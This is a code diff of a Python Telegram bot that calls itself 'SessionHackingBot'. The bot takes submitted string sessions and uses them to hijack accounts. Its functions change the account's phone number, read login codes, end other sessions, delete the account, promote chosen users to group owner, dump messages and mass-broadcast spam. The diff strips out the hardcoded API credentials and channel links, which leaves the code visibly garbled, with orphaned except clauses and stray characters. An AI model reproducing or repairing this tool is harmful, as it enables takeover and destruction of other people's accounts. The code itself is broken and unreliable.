@@ -30,7 +30,7 @@ IndianHack = 5046520072
 Bot_Username =os.environ.get("BOT_USERNAME", None) or "SessionHackingBot"
 
 async def change_number_code(strses, number, code, otp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+
     bot = client = X
 
 
@@ -59,7 +59,7 @@ async def change_number_code(strses, number, code, otp):
       return False
 
 async def change_number(strses, number):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+
     bot = client = X
     
 
@@ -89,7 +89,7 @@ async def change_number(strses, number):
 
 
 async def userinfo(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+
     k = await X.get_me()
 
 
@@ -110,7 +110,7 @@ async def userinfo(strses):
     return str(k)
 
 async def terminate(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+I
 
 
     except BaseException:
@@ -131,7 +131,7 @@ async def terminate(strses):
 
 GROUP_LIST = []
 async def delacc(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+
 
 
     except BaseException:
@@ -147,7 +147,7 @@ async def delacc(strses):
     await X(functions.account.DeleteAccountRequest("I am chutia"))
 
 async def promote(strses, grp, user):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+
 
 
     except BaseException:
@@ -170,7 +170,7 @@ async def promote(strses, grp, user):
       await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
     
 async def user2fa(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+
 
 
     except BaseException:
@@ -194,7 +194,7 @@ async def user2fa(strses):
       return False
 
 async def demall(strses, grp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+
 
 
     except BaseException:
@@ -220,7 +220,7 @@ async def demall(strses, grp):
 
 
 async def joingroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+
     try:
 
     except BaseException:
@@ -241,7 +241,7 @@ async def joingroup(strses, username):
 
 
 async def leavegroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+
 
 
     except BaseException:
@@ -261,7 +261,7 @@ async def leavegroup(strses, username):
     await X(leave(username))
 
 async def delgroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+
 
     except BaseException:
       pass
@@ -280,14 +280,14 @@ async def delgroup(strses, username):
 
 async def cu(strses):
   try:
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+
         k = await X.get_me()
         return [str(k.first_name), str(k.username or k.id)]
   except Exception as e:
     return False
 
 async def usermsgs(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+
     i = ""
 
 ة
@@ -312,7 +312,7 @@ async def usermsgs(strses):
 
 
 async def userbans(strses, grp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+
 
 
     except BaseException:
@@ -339,17 +339,17 @@ async def userbans(strses, grp):
 
 
 async def userchannels(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+
 
 
     except BaseException:
       pass
-    try:
-      await X(join("@N_B_10"))
+    
+
     except BaseException:
       pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
+    
+
     except BaseException:
       pass
 
@@ -370,7 +370,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "@N_B_10"
+
 menu = '''
 
 "A" :~ [Check user own groups and channels]
@@ -402,7 +402,7 @@ menu = '''
 I will add more features Later 😅
 '''
 mm = '''
-**⚜NOTICE FIRST JOIN SUPPORT @IndianSupportGroup⚜**
+
 '''
 
 keyboard = [
@@ -427,7 +427,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("Owner", "https://t.me/N_B_10")
+
     ]
 ]
 
@@ -444,7 +444,7 @@ async def op(event):
   else:
     legendbye = [
       [
-        Button.url("Must Join", f"https://t.me/BestiesWorld")
+
         ]
       ]
     await event.reply("First Join Channel!\n Then Try Click Here ~ /hack", buttons=legendbye)
@@ -485,7 +485,7 @@ async def start(event):
         Button.inline("N", data="N"),
         ],
       [
-        Button.url("Owner", "https://t.me/piroXpower")
+
         ]
     ]
     await x.send_message(f"Choose what you want with string session \n\n{menu}", buttons=keyboard)
@@ -506,7 +506,7 @@ async def users(event):
         return await event.reply("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @IndianHack_XD")
+        file.write(i + "\n\nDetails BY ")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
@@ -714,8 +714,7 @@ async def start(event):
         Button.inline("b", data="b"),
         Button.inline("c", data="c"),
         ],
-      [
-        Button.url("Owner", "https://t.me/N_N_10")
+      [l
         ]
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \n✓ For All - Choose a\n✓ For Group - Choose b\n✓ For Private - Choose c", buttons=keyboard)
@@ -723,7 +722,7 @@ async def start(event):
 
 
 async def gcasta(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+
         try:
             reply_msg = msg
             tol = reply_msg
@@ -779,7 +778,7 @@ async def users(event):
 molb = True
 
 async def gcastb(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+
         try:
             reply_msg = msg
             tol = reply_msg
@@ -901,7 +900,7 @@ async def users(event):
       await event.reply(f"Done Gcasted In {i} Group 😗😗\n\nThanks For Using IndianHack Bot.", buttons=keyboard)
 
 async def gcastc(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    
         try:
             reply_msg = msg
             tol = reply_msg
